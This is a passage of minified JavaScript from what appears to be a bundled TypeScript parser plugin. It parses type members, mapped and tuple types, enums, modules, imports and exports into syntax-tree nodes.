J=super.parseBindingList(11,41,2);for(let Y of J){let{type:W}=Y;if(W==="AssignmentPattern"||W==="TSParameterProperty")this.raise(_1.UnsupportedSignatureParameterKind,Y,{type:W})}return J}tsParseTypeMemberSemicolon(){if(!this.eat(12)&&!this.isLineTerminator())this.expect(13)}tsParseSignatureMember(J,Y){return this.tsFillSignature(14,Y),this.tsParseTypeMemberSemicolon(),this.finishNode(Y,J)}tsIsUnambiguouslyIndexSignature(){if(this.next(),w0(this.state.type))return this.next(),this.match(14);return!1}tsTryParseIndexSignature(J){if(!(this.match(0)&&this.tsLookAhead(this.tsIsUnambiguouslyIndexSignature.bind(this))))return;this.expect(0);let Y=this.parseIdentifier();Y.typeAnnotation=this.tsParseTypeAnnotation(),this.resetEndLocation(Y),this.expect(3),J.parameters=[Y];let W=this.tsTryParseTypeAnnotation();if(W)J.typeAnnotation=W;return this.tsParseTypeMemberSemicolon(),this.finishNode(J,"TSIndexSignature")}tsParsePropertyOrMethodSignature(J,Y){if(this.eat(17))J.optional=!0;if(this.match(10)||this.match(47)){if(Y)this.raise(_1.ReadonlyForMethodSignature,J);let W=J;if(W.kind&&this.match(47))this.raise(_1.AccessorCannotHaveTypeParameters,this.state.curPosition());this.tsFillSignature(14,W),this.tsParseTypeMemberSemicolon();let G="parameters",H="typeAnnotation";if(W.kind==="get"){if(W[G].length>0){if(this.raise(x.BadGetterArity,this.state.curPosition()),this.isThisParam(W[G][0]))this.raise(_1.AccessorCannotDeclareThisParameter,this.state.curPosition())}}else if(W.kind==="set"){if(W[G].length!==1)this.raise(x.BadSetterArity,this.state.curPosition());else{let $=W[G][0];if(this.isThisParam($))this.raise(_1.AccessorCannotDeclareThisParameter,this.state.curPosition());if($.type==="Identifier"&&$.optional)this.raise(_1.SetAccessorCannotHaveOptionalParameter,this.state.curPosition());if($.type==="RestElement")this.raise(_1.SetAccessorCannotHaveRestParameter,this.state.curPosition())}if(W[H])this.raise(_1.SetAccessorCannotHaveReturnType,W[H])}else W.kind="method";return this.finishNode(W,"TSMethodSignature")}else{let W=J;if(Y)W.readonly=!0;let G=this.tsTryParseTypeAnnotation();if(G)W.typeAnnotation=G;return this.tsParseTypeMemberSemicolon(),this.finishNode(W,"TSPropertySignature")}}tsParseTypeMember(){let J=this.startNode();if(this.match(10)||this.match(47))return this.tsParseSignatureMember("TSCallSignatureDeclaration",J);if(this.match(77)){let W=this.startNode();if(this.next(),this.match(10)||this.match(47))return this.tsParseSignatureMember("TSConstructSignatureDeclaration",J);else return J.key=this.createIdentifier(W,"new"),this.tsParsePropertyOrMethodSignature(J,!1)}this.tsParseModifiers({allowedModifiers:["readonly"],disallowedModifiers:["declare","abstract","private","protected","public","static","override"]},J);let Y=this.tsTryParseIndexSignature(J);if(Y)return Y;if(super.parsePropertyName(J),!J.computed&&J.key.type==="Identifier"&&(J.key.name==="get"||J.key.name==="set")&&this.tsTokenCanFollowModifier()){if(J.kind=J.key.name,super.parsePropertyName(J),!this.match(10)&&!this.match(47))this.unexpected(null,10)}return this.tsParsePropertyOrMethodSignature(J,!!J.readonly)}tsParseTypeLiteral(){let J=this.startNode();return J.members=this.tsParseObjectTypeMembers(),this.finishNode(J,"TSTypeLiteral")}tsParseObjectTypeMembers(){this.expect(5);let J=this.tsParseList("TypeMembers",this.tsParseTypeMember.bind(this));return this.expect(8),J}tsIsStartOfMappedType(){if(this.next(),this.eat(53))return this.isContextual(122);if(this.isContextual(122))this.next();if(!this.match(0))return!1;if(this.next(),!this.tsIsIdentifier())return!1;return this.next(),this.match(58)}tsParseMappedType(){let J=this.startNode();if(this.expect(5),this.match(53))J.readonly=this.state.value,this.next(),this.expectContextual(122);else if(this.eatContextual(122))J.readonly=!0;this.expect(0);{let Y=this.startNode();Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsExpectThenParseType(58),J.typeParameter=this.finishNode(Y,"TSTypeParameter")}if(J.nameType=this.eatContextual(93)?this.tsParseType():null,this.expect(3),this.match(53))J.optional=this.state.value,this.next(),this.expect(17);else if(this.eat(17))J.optional=!0;return J.typeAnnotation=this.tsTryParseType(),this.semicolon(),this.expect(8),this.finishNode(J,"TSMappedType")}tsParseTupleType(){let J=this.startNode();J.elementTypes=this.tsParseBracketedList("TupleElementTypes",this.tsParseTupleElementType.bind(this),!0,!1);let Y=!1;return J.elementTypes.forEach((W)=>{let{type:G}=W;if(Y&&G!=="TSRestType"&&G!=="TSOptionalType"&&!(G==="TSNamedTupleMember"&&W.optional))this.raise(_1.OptionalTypeBeforeRequired,W);Y||(Y=G==="TSNamedTupleMember"&&W.optional||G==="TSOptionalType")}),this.finishNode(J,"TSTupleType")}tsParseTupleElementType(){let J=this.state.startLoc,Y=this.eat(21),{startLoc:W}=this.state,G,H,$,z,K=C6(this.state.type)?this.lookaheadCharCode():null;if(K===58)G=!0,$=!1,H=this.parseIdentifier(!0),this.expect(14),z=this.tsParseType();else if(K===63){$=!0;let B=this.state.value,q=this.tsParseNonArrayType();if(this.lookaheadCharCode()===58)G=!0,H=this.createIdentifier(this.startNodeAt(W),B),this.expect(17),this.expect(14),z=this.tsParseType();else G=!1,z=q,this.expect(17)}else z=this.tsParseType(),$=this.eat(17),G=this.eat(14);if(G){let B;if(H){if(B=this.startNodeAt(W),B.optional=$,B.label=H,B.elementType=z,this.eat(17))B.optional=!0,this.raise(_1.TupleOptionalAfterType,this.state.lastTokStartLoc)}else B=this.startNodeAt(W),B.optional=$,this.raise(_1.InvalidTupleMemberLabel,z),B.label=z,B.elementType=this.tsParseType();z=this.finishNode(B,"TSNamedTupleMember")}else if($){let B=this.startNodeAt(W);B.typeAnnotation=z,z=this.finishNode(B,"TSOptionalType")}if(Y){let B=this.startNodeAt(J);B.typeAnnotation=z,z=this.finishNode(B,"TSRestType")}return z}tsParseParenthesizedType(){let J=this.startNode();return this.expect(10),J.typeAnnotation=this.tsParseType(),this.expect(11),this.finishNode(J,"TSParenthesizedType")}tsParseFunctionOrConstructorType(J,Y){let W=this.startNode();if(J==="TSConstructorType"){if(W.abstract=!!Y,Y)this.next();this.next()}return this.tsInAllowConditionalTypesContext(()=>this.tsFillSignature(19,W)),this.finishNode(W,J)}tsParseLiteralTypeNode(){let J=this.startNode();switch(this.state.type){case 135:case 136:case 134:case 85:case 86:J.literal=super.parseExprAtom();break;default:this.unexpected()}return this.finishNode(J,"TSLiteralType")}tsParseTemplateLiteralType(){{let J=this.startNode();return J.literal=super.parseTemplate(!1),this.finishNode(J,"TSLiteralType")}}parseTemplateSubstitution(){if(this.state.inType)return this.tsParseType();return super.parseTemplateSubstitution()}tsParseThisTypeOrThisTypePredicate(){let J=this.tsParseThisTypeNode();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.tsParseThisTypePredicate(J);else return J}tsParseNonArrayType(){switch(this.state.type){case 134:case 135:case 136:case 85:case 86:return this.tsParseLiteralTypeNode();case 53:if(this.state.value==="-"){let J=this.startNode(),Y=this.lookahead();if(Y.type!==135&&Y.type!==136)this.unexpected();return J.literal=this.parseMaybeUnary(),this.finishNode(J,"TSLiteralType")}break;case 78:return this.tsParseThisTypeOrThisTypePredicate();case 87:return this.tsParseTypeQuery();case 83:return this.tsParseImportType();case 5:return this.tsLookAhead(this.tsIsStartOfMappedType.bind(this))?this.tsParseMappedType():this.tsParseTypeLiteral();case 0:return this.tsParseTupleType();case 10:return this.tsParseParenthesizedType();case 25:case 24:return this.tsParseTemplateLiteralType();default:{let{type:J}=this.state;if(w0(J)||J===88||J===84){let Y=J===88?"TSVoidKeyword":J===84?"TSNullKeyword":lv(this.state.value);if(Y!==void 0&&this.lookaheadCharCode()!==46){let W=this.startNode();return this.next(),this.finishNode(W,Y)}return this.tsParseTypeReference()}}}this.unexpected()}tsParseArrayTypeOrHigher(){let{startLoc:J}=this.state,Y=this.tsParseNonArrayType();while(!this.hasPrecedingLineBreak()&&this.eat(0))if(this.match(3)){let W=this.startNodeAt(J);W.elementType=Y,this.expect(3),Y=this.finishNode(W,"TSArrayType")}else{let W=this.startNodeAt(J);W.objectType=Y,W.indexType=this.tsParseType(),this.expect(3),Y=this.finishNode(W,"TSIndexedAccessType")}return Y}tsParseTypeOperator(){let J=this.startNode(),Y=this.state.value;if(this.next(),J.operator=Y,J.typeAnnotation=this.tsParseTypeOperatorOrHigher(),Y==="readonly")this.tsCheckTypeAnnotationForReadOnly(J);return this.finishNode(J,"TSTypeOperator")}tsCheckTypeAnnotationForReadOnly(J){switch(J.typeAnnotation.type){case"TSTupleType":case"TSArrayType":return;default:this.raise(_1.UnexpectedReadonly,J)}}tsParseInferType(){let J=this.startNode();this.expectContextual(115);let Y=this.startNode();return Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsTryParse(()=>this.tsParseConstraintForInferType()),J.typeParameter=this.finishNode(Y,"TSTypeParameter"),this.finishNode(J,"TSInferType")}tsParseConstraintForInferType(){if(this.eat(81)){let J=this.tsInDisallowConditionalTypesContext(()=>this.tsParseType());if(this.state.inDisallowConditionalTypesContext||!this.match(17))return J}}tsParseTypeOperatorOrHigher(){return Vv(this.state.type)&&!this.state.containsEsc?this.tsParseTypeOperator():this.isContextual(115)?this.tsParseInferType():this.tsInAllowConditionalTypesContext(()=>this.tsParseArrayTypeOrHigher())}tsParseUnionOrIntersectionType(J,Y,W){let G=this.startNode(),H=this.eat(W),$=[];do $.push(Y());while(this.eat(W));if($.length===1&&!H)return $[0];return G.types=$,this.finishNode(G,J)}tsParseIntersectionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSIntersectionType",this.tsParseTypeOperatorOrHigher.bind(this),45)}tsParseUnionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSUnionType",this.tsParseIntersectionTypeOrHigher.bind(this),43)}tsIsStartOfFunctionType(){if(this.match(47))return!0;return this.match(10)&&this.tsLookAhead(this.tsIsUnambiguouslyStartOfFunctionType.bind(this))}tsSkipParameterStart(){if(w0(this.state.type)||this.match(78))return this.next(),!0;if(this.match(5)){let{errors:J}=this.state,Y=J.length;try{return this.parseObjectLike(8,!0),J.length===Y}catch(W){return!1}}if(this.match(0)){this.next();let{errors:J}=this.state,Y=J.length;try{return super.parseBindingList(3,93,1),J.length===Y}catch(W){return!1}}return!1}tsIsUnambiguouslyStartOfFunctionType(){if(this.next(),this.match(11)||this.match(21))return!0;if(this.tsSkipParameterStart()){if(this.match(14)||this.match(12)||this.match(17)||this.match(29))return!0;if(this.match(11)){if(this.next(),this.match(19))return!0}}return!1}tsParseTypeOrTypePredicateAnnotation(J){return this.tsInType(()=>{let Y=this.startNode();this.expect(J);let W=this.startNode(),G=!!this.tsTryParse(this.tsParseTypePredicateAsserts.bind(this));if(G&&this.match(78)){let z=this.tsParseThisTypeOrThisTypePredicate();if(z.type==="TSThisType")W.parameterName=z,W.asserts=!0,W.typeAnnotation=null,z=this.finishNode(W,"TSTypePredicate");else this.resetStartLocationFromNode(z,W),z.asserts=!0;return Y.typeAnnotation=z,this.finishNode(Y,"TSTypeAnnotation")}let H=this.tsIsIdentifier()&&this.tsTryParse(this.tsParseTypePredicatePrefix.bind(this));if(!H){if(!G)return this.tsParseTypeAnnotation(!1,Y);return W.parameterName=this.parseIdentifier(),W.asserts=G,W.typeAnnotation=null,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")}let $=this.tsParseTypeAnnotation(!1);return W.parameterName=H,W.typeAnnotation=$,W.asserts=G,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")})}tsTryParseTypeOrTypePredicateAnnotation(){if(this.match(14))return this.tsParseTypeOrTypePredicateAnnotation(14)}tsTryParseTypeAnnotation(){if(this.match(14))return this.tsParseTypeAnnotation()}tsTryParseType(){return this.tsEatThenParseType(14)}tsParseTypePredicatePrefix(){let J=this.parseIdentifier();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.next(),J}tsParseTypePredicateAsserts(){if(this.state.type!==109)return!1;let J=this.state.containsEsc;if(this.next(),!w0(this.state.type)&&!this.match(78))return!1;if(J)this.raise(x.InvalidEscapedReservedWord,this.state.lastTokStartLoc,{reservedWord:"asserts"});return!0}tsParseTypeAnnotation(J=!0,Y=this.startNode()){return this.tsInType(()=>{if(J)this.expect(14);Y.typeAnnotation=this.tsParseType()}),this.finishNode(Y,"TSTypeAnnotation")}tsParseType(){Fq(this.state.inType);let J=this.tsParseNonConditionalType();if(this.state.inDisallowConditionalTypesContext||this.hasPrecedingLineBreak()||!this.eat(81))return J;let Y=this.startNodeAtNode(J);return Y.checkType=J,Y.extendsType=this.tsInDisallowConditionalTypesContext(()=>this.tsParseNonConditionalType()),this.expect(17),Y.trueType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.expect(14),Y.falseType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.finishNode(Y,"TSConditionalType")}isAbstractConstructorSignature(){return this.isContextual(124)&&this.isLookaheadContextual("new")}tsParseNonConditionalType(){if(this.tsIsStartOfFunctionType())return this.tsParseFunctionOrConstructorType("TSFunctionType");if(this.match(77))return this.tsParseFunctionOrConstructorType("TSConstructorType");else if(this.isAbstractConstructorSignature())return this.tsParseFunctionOrConstructorType("TSConstructorType",!0);return this.tsParseUnionTypeOrHigher()}tsParseTypeAssertion(){if(this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(_1.ReservedTypeAssertion,this.state.startLoc);let J=this.startNode();return J.typeAnnotation=this.tsInType(()=>{return this.next(),this.match(75)?this.tsParseTypeReference():this.tsParseType()}),this.expect(48),J.expression=this.parseMaybeUnary(),this.finishNode(J,"TSTypeAssertion")}tsParseHeritageClause(J){let Y=this.state.startLoc,W=this.tsParseDelimitedList("HeritageClauseElement",()=>{{let G=this.startNode();if(G.expression=this.tsParseEntityName(3),this.match(47))G.typeParameters=this.tsParseTypeArguments();return this.finishNode(G,"TSExpressionWithTypeArguments")}});if(!W.length)this.raise(_1.EmptyHeritageClauseType,Y,{token:J});return W}tsParseInterfaceDeclaration(J,Y={}){if(this.hasFollowingLineBreak())return null;if(this.expectContextual(129),Y.declare)J.declare=!0;if(w0(this.state.type))J.id=this.parseIdentifier(),this.checkIdentifier(J.id,130);else J.id=null,this.raise(_1.MissingInterfaceName,this.state.startLoc);if(J.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers),this.eat(81))J.extends=this.tsParseHeritageClause("extends");let W=this.startNode();return W.body=this.tsInType(this.tsParseObjectTypeMembers.bind(this)),J.body=this.finishNode(W,"TSInterfaceBody"),this.finishNode(J,"TSInterfaceDeclaration")}tsParseTypeAliasDeclaration(J){return J.id=this.parseIdentifier(),this.checkIdentifier(J.id,2),J.typeAnnotation=this.tsInType(()=>{if(J.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutModifiers),this.expect(29),this.isContextual(114)&&this.lookaheadCharCode()!==46){let Y=this.startNode();return this.next(),this.finishNode(Y,"TSIntrinsicKeyword")}return this.tsParseType()}),this.semicolon(),this.finishNode(J,"TSTypeAliasDeclaration")}tsInTopLevelContext(J){if(this.curContext()!==L0.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return J()}finally{this.state.context=Y}}else return J()}tsInType(J){let Y=this.state.inType;this.state.inType=!0;try{return J()}finally{this.state.inType=Y}}tsInDisallowConditionalTypesContext(J){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!0;try{return J()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsInAllowConditionalTypesContext(J){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!1;try{return J()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsEatThenParseType(J){if(this.match(J))return this.tsNextThenParseType()}tsExpectThenParseType(J){return this.tsInType(()=>{return this.expect(J),this.tsParseType()})}tsNextThenParseType(){return this.tsInType(()=>{return this.next(),this.tsParseType()})}tsParseEnumMember(){let J=this.startNode();if(J.id=this.match(134)?super.parseStringLiteral(this.state.value):this.parseIdentifier(!0),this.eat(29))J.initializer=super.parseMaybeAssignAllowIn();return this.finishNode(J,"TSEnumMember")}tsParseEnumDeclaration(J,Y={}){if(Y.const)J.const=!0;if(Y.declare)J.declare=!0;return this.expectContextual(126),J.id=this.parseIdentifier(),this.checkIdentifier(J.id,J.const?8971:8459),this.expect(5),J.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(J,"TSEnumDeclaration")}tsParseEnumBody(){let J=this.startNode();return this.expect(5),J.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(J,"TSEnumBody")}tsParseModuleBlock(){let J=this.startNode();return this.scope.enter(0),this.expect(5),super.parseBlockOrModuleBlockBody(J.body=[],void 0,!0,8),this.scope.exit(),this.finishNode(J,"TSModuleBlock")}tsParseModuleOrNamespaceDeclaration(J,Y=!1){if(J.id=this.parseIdentifier(),!Y)this.checkIdentifier(J.id,1024);if(this.eat(16)){let W=this.startNode();this.tsParseModuleOrNamespaceDeclaration(W,!0),J.body=W}else this.scope.enter(1024),this.prodParam.enter(0),J.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();return this.finishNode(J,"TSModuleDeclaration")}tsParseAmbientExternalModuleDeclaration(J){if(this.isContextual(112))J.kind="global",J.global=!0,J.id=this.parseIdentifier();else if(this.match(134))J.kind="module",J.id=super.parseStringLiteral(this.state.value);else this.unexpected();if(this.match(5))this.scope.enter(1024),this.prodParam.enter(0),J.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();else this.semicolon();return this.finishNode(J,"TSModuleDeclaration")}tsParseImportEqualsDeclaration(J,Y,W){J.isExport=W||!1,J.id=Y||this.parseIdentifier(),this.checkIdentifier(J.id,4096),this.expect(29);let G=this.tsParseModuleReference();if(J.importKind==="type"&&G.type!=="TSExternalModuleReference")this.raise(_1.ImportAliasHasImportType,G);return J.moduleReference=G,this.semicolon(),this.finishNode(J,"TSImportEqualsDeclaration")}tsIsExternalModuleReference(){return this.isContextual(119)&&this.lookaheadCharCode()===40}tsParseModuleReference(){return this.tsIsExternalModuleReference()?this.tsParseExternalModuleReference():this.tsParseEntityName(0)}tsParseExternalModuleReference(){let J=this.startNode();if(this.expectContextual(119),this.expect(10),!this.match(134))this.unexpected();return J.expression=super.parseExprAtom(),this.expect(11),this.sawUnambiguousESM=!0,this.finishNode(J,"TSExternalModuleReference")}tsLookAhead(J){let Y=this.state.clone(),W=J();return this.state=Y,W}tsTryParseAndCatch(J){let Y=this.tryParse((W)=>J()||W());if(Y.aborted||!Y.node)return;if(Y.error)this.state=Y.failState;return Y.node}tsTryParse(J){let Y=this.state.clone(),W=J();if(W!==void 0&&W!==!1)return W;this.state=Y}tsTryParseDeclare(J){if(this.isLineTerminator())return;let Y=this.state.type;return this.tsInAmbientContext(()=>{switch(Y){case 68:return J.declare=!0,super.parseFunctionStatement(J,!1,!1);case 80:return J.declare=!0,this.parseClass(J,!0,!1);case 126:return this.tsParseEnumDeclaration(J,{declare:!0});case 112:return this.tsParseAmbientExternalModuleDeclaration(J);case 100:if(this.state.containsEsc)return;case 75:case 74:if(!this.match(75)||!this.isLookaheadContextual("enum"))return J.declare=!0,this.parseVarStatement(J,this.state.value,!0);return this.expect(75),this.tsParseEnumDeclaration(J,{const:!0,declare:!0});case 107:if(this.isUsing())return this.raise(_1.InvalidModifierOnUsingDeclaration,this.state.startLoc,"declare"),J.declare=!0,this.parseVarStatement(J,"using",!0);break;case 96:if(this.isAwaitUsing())return this.raise(_1.InvalidModifierOnAwaitUsingDeclaration,this.state.startLoc,"declare"),J.declare=!0,this.next(),this.parseVarStatement(J,"await using",!0);break;case 129:{let W=this.tsParseInterfaceDeclaration(J,{declare:!0});if(W)return W}default:if(w0(Y))return this.tsParseDeclaration(J,this.state.value,!0,null)}})}tsTryParseExportDeclaration(){return this.tsParseDeclaration(this.startNode(),this.state.value,!0,null)}tsParseExpressionStatement(J,Y,W){switch(Y.name){case"declare":{let G=this.tsTryParseDeclare(J);if(G)G.declare=!0;return G}case"global":if(this.match(5)){this.scope.enter(1024),this.prodParam.enter(0);let G=J;return G.kind="global",J.global=!0,G.id=Y,G.body=this.tsParseModuleBlock(),this.scope.exit(),this.prodParam.exit(),this.finishNode(G,"TSModuleDeclaration")}break;default:return this.tsParseDeclaration(J,Y.name,!1,W)}}tsParseDeclaration(J,Y,W,G){switch(Y){case"abstract":if(this.tsCheckLineTerminator(W)&&(this.match(80)||w0(this.state.type)))return this.tsParseAbstractDeclaration(J,G);break;case"module":if(this.tsCheckLineTerminator(W)){if(this.match(134))return this.tsParseAmbientExternalModuleDeclaration(J);else if(w0(this.state.type))return J.kind="module",this.tsParseModuleOrNamespaceDeclaration(J)}break;case"namespace":if(this.tsCheckLineTerminator(W)&&w0(this.state.type))return J.kind="namespace",this.tsParseModuleOrNamespaceDeclaration(J);break;case"type":if(this.tsCheckLineTerminator(W)&&w0(this.state.type))return this.tsParseTypeAliasDeclaration(J);break}}tsCheckLineTerminator(J){if(J){if(this.hasFollowingLineBreak())return!1;return this.next(),!0}return!this.isLineTerminator()}tsTryParseGenericAsyncArrowFunction(J){if(!this.match(47))return;let Y=this.state.maybeInArrowParameters;this.state.maybeInArrowParameters=!0;let W=this.tsTryParseAndCatch(()=>{let G=this.startNodeAt(J);return G.typeParameters=this.tsParseTypeParameters(this.tsParseConstModifier),super.parseFunctionParams(G),G.returnType=this.tsTryParseTypeOrTypePredicateAnnotation(),this.expect(19),G});if(this.state.maybeInArrowParameters=Y,!W)return;return super.parseArrowExpression(W,null,!0)}tsParseTypeArgumentsInExpression(){if(this.reScan_lt()!==47)return;return this.tsParseTypeArguments()}tsParseTypeArguments(){let J=this.startNode();if(J.params=this.tsInType(()=>this.tsInTopLevelContext(()=>{return this.expect(47),this.tsParseDelimitedList("TypeParametersOrArguments",this.tsParseType.bind(this))})),J.params.length===0)this.raise(_1.EmptyTypeArguments,J);else if(!this.state.inType&&this.curContext()===L0.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(J,"TSTypeParameterInstantiation")}tsIsDeclarationStart(){return Bv(this.state.type)}isExportDefaultSpecifier(){if(this.tsIsDeclarationStart())return!1;return super.isExportDefaultSpecifier()}parseBindingElement(J,Y){let W=Y.length?Y[0].loc.start:this.state.startLoc,G={};this.tsParseModifiers({allowedModifiers:["public","private","protected","override","readonly"]},G);let{accessibility:H,override:$,readonly:z}=G;if(!(J&4)&&(H||z||$))this.raise(_1.UnexpectedParameterModifier,W);let U=this.parseMaybeDefault();if(J&2)this.parseFunctionParamType(U);let K=this.parseMaybeDefault(U.loc.start,U);if(H||z||$){let B=this.startNodeAt(W);if(Y.length)B.decorators=Y;if(H)B.accessibility=H;if(z)B.readonly=z;if($)B.override=$;if(K.type!=="Identifier"&&K.type!=="AssignmentPattern")this.raise(_1.UnsupportedParameterPropertyKind,B);return B.parameter=K,this.finishNode(B,"TSParameterProperty")}if(Y.length)U.decorators=Y;return K}isSimpleParameter(J){return J.type==="TSParameterProperty"&&super.isSimpleParameter(J.parameter)||super.isSimpleParameter(J)}tsDisallowOptionalPattern(J){for(let Y of J.params)if(Y.type!=="Identifier"&&Y.optional&&!this.state.isAmbientContext)this.raise(_1.PatternIsOptional,Y)}setArrowFunctionParameters(J,Y,W){super.setArrowFunctionParameters(J,Y,W),this.tsDisallowOptionalPattern(J)}parseFunctionBodyAndFinish(J,Y,W=!1){if(this.match(14))J.returnType=this.tsParseTypeOrTypePredicateAnnotation(14);let G=Y==="FunctionDeclaration"?"TSDeclareFunction":Y==="ClassMethod"||Y==="ClassPrivateMethod"?"TSDeclareMethod":void 0;if(G&&!this.match(5)&&this.isLineTerminator())return this.finishNode(J,G);if(G==="TSDeclareFunction"&&this.state.isAmbientContext){if(this.raise(_1.DeclareFunctionHasImplementation,J),J.declare)return super.parseFunctionBodyAndFinish(J,G,W)}return this.tsDisallowOptionalPattern(J),super.parseFunctionBodyAndFinish(J,Y,W)}registerFunctionStatementId(J){if(!J.body&&J.id)this.checkIdentifier(J.id,1024);else super.registerFunctionStatementId(J)}tsCheckForInvalidTypeCasts(J){J.forEach((Y)=>{if((Y==null?void 0:Y.type)==="TSTypeCastExpression")this.raise(_1.UnexpectedTypeAnnotation,Y.typeAnnotation)})}toReferencedList(J,Y){return this.tsCheckForInvalidTypeCasts(J),J}parseArrayLike(J,Y,W,G){let H=super.parseArrayLike(J,Y,W,G);if(H.type==="ArrayExpression")this.tsCheckForInvalidTypeCasts(H.elements);return H}parseSubscript(J,Y,W,G){if(!this.hasPrecedingLineBreak()&&this.match(35)){this.state.canStartJSXElement=!1,this.next();let $=this.startNodeAt(Y);return $.expression=J,this.finishNode($,"TSNonNullExpression")}let H=!1;if(this.match(18)&&this.lookaheadCharCode()===60){if(W)return G.stop=!0,J;G.optionalChainMember=H=!0,this.next()}if(this.match(47)||this.match(51)){let $,z=this.tsTryParseAndCatch(()=>{if(!W&&this.atPossibleAsyncArrow(J)){let q=this.tsTryParseGenericAsyncArrowFunction(Y);if(q)return G.stop=!0,q}let U=this.tsParseTypeArgumentsInExpression();if(!U)return;if(H&&!this.match(10)){$=this.state.curPosition();return}if(aJ(this.state.type)){let q=super.parseTaggedTemplateExpression(J,Y,G);return q.typeParameters=U,q}if(!W&&this.eat(10)){let q=this.startNodeAt(Y);if(q.callee=J,q.arguments=this.parseCallExpressionArguments(),this.tsCheckForInvalidTypeCasts(q.arguments),q.typeParameters=U,G.optionalChainMember)q.optional=H;return this.finishCallExpression(q,G.optionalChainMember)}let K=this.state.type;if(K===48||K===52||K!==10&&C4(K)&&!this.hasPrecedingLineBreak())return;let B=this.startNodeAt(Y);return B.expression=J,B.typeParameters=U,this.finishNode(B,"TSInstantiationExpression")});if($)this.unexpected($,10);if(z){if(z.type==="TSInstantiationExpression"){if(this.match(16)||this.match(18)&&this.lookaheadCharCode()!==40)this.raise(_1.InvalidPropertyAccessAfterInstantiationExpression,this.state.startLoc);if(!this.match(16)&&!this.match(18))z.expression=super.stopParseSubscript(J,G)}return z}}return super.parseSubscript(J,Y,W,G)}parseNewCallee(J){var Y;super.parseNewCallee(J);let{callee:W}=J;if(W.type==="TSInstantiationExpression"&&!((Y=W.extra)!=null&&Y.parenthesized))J.typeParameters=W.typeParameters,J.callee=W.expression}parseExprOp(J,Y,W){let G;if(rJ(58)>W&&!this.hasPrecedingLineBreak()&&(this.isContextual(93)||(G=this.isContextual(120)))){let H=this.startNodeAt(Y);return H.expression=J,H.typeAnnotation=this.tsInType(()=>{if(this.next(),this.match(75)){if(G)this.raise(x.UnexpectedKeyword,this.state.startLoc,{keyword:"const"});return this.tsParseTypeReference()}return this.tsParseType()}),this.finishNode(H,G?"TSSatisfiesExpression":"TSAsExpression"),this.reScan_lt_gt(),this.parseExprOp(H,Y,W)}return super.parseExprOp(J,Y,W)}checkReservedWord(J,Y,W,G){if(!this.state.isAmbientContext)super.checkReservedWord(J,Y,W,G)}checkImportReflection(J){if(super.checkImportReflection(J),J.module&&J.importKind!=="value")this.raise(_1.ImportReflectionHasImportType,J.specifiers[0].loc.start)}checkDuplicateExports(){}isPotentialImportPhase(J){if(super.isPotentialImportPhase(J))return!0;if(this.isContextual(130)){let Y=this.lookaheadCharCode();return J?Y===123||Y===42:Y!==61}return!J&&this.isContextual(87)}applyImportPhase(J,Y,W,G){if(super.applyImportPhase(J,Y,W,G),Y)J.exportKind=W==="type"?"type":"value";else J.importKind=W==="type"||W==="typeof"?W:"value"}parseImport(J){if(this.match(134))return J.importKind="value",super.parseImport(J);let Y;if(w0(this.state.type)&&this.lookaheadCharCode()===61)return J.importKind="value",this.tsParseImportEqualsDeclaration(J);else if(this.isContextual(130)){let W=this.parseMaybeImportPhase(J,!1);if(this.lookaheadCharCode()===61)return this.tsParseImportEqualsDeclaration(J,W);else Y=super.parseImportSpecifiersAndAfter(J,W)}else Y=super.parseImport(J);if(Y.importKind==="type"&&Y.specifiers.length>1&&Y.specifiers[0].type==="ImportDefaultSpecifier")this.raise(_1.TypeImportCannotSpecifyDefaultAndNamed,Y);return Y}parseExport(J,Y){if(this.match(83)){let W=J;this.next();let G=null;if(this.isContextual(130)&&this.isPotentialImportPhase(!1))G=this.parseMaybeImportPhase(W,!1);else W.importKind="value";return this.tsParseImportEqualsDeclaration(W,G,!0)}else if(this.eat(29)){let W=J;return W.expression=super.parseExpression(),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(W,"TSExportAssignment")}else if(this.eatContextual(93)){let W=J;return this.expectContextual(128),W.id=this.parseIdentifier(),this.semicolon(),this.finishNode(W,"TSNamespaceExportDeclaration")}else return super.parseExport(J,Y)}isAbstractClass(){return this.isContextual(124)&&this.isLookaheadContextual("class")}parseExportDefaultExpression(){if(this.isAbstractClass()){let J=this.startNode();return this.next(),J.abstract=!0,this.parseClass(J,!0,!0)}if(this.match(129)){let J=this.tsParseInterfaceDeclaration(this.startNode());if(J)return J}return super.parseExportDefaultExpression()}parseVarStatement(J,Y,W=!1){let{isAmbientContext:G}=this.state,H=super.parseVarStatement(J,Y,W||G);if(!G)return H;if(!J.declare&&(Y==="using"||Y==="await using"))return this.raiseOverwrite(_1.UsingDeclarationInAmbientContext,J,Y),H;for(let{id:$,init:z}of H.declarations){if(!z)continue;if(Y==="var"||Y==="let"||!!$.typeAnnotation)this.raise(_1.InitializerNotAllowedInAmbientContext,z);else if(!rv(z,this.hasPlugin("estree")))this.raise(_1.ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference,z)}return H}parseStatementContent(J,Y){if(this.match(75)&&this.isLookaheadContextual("enum")){let 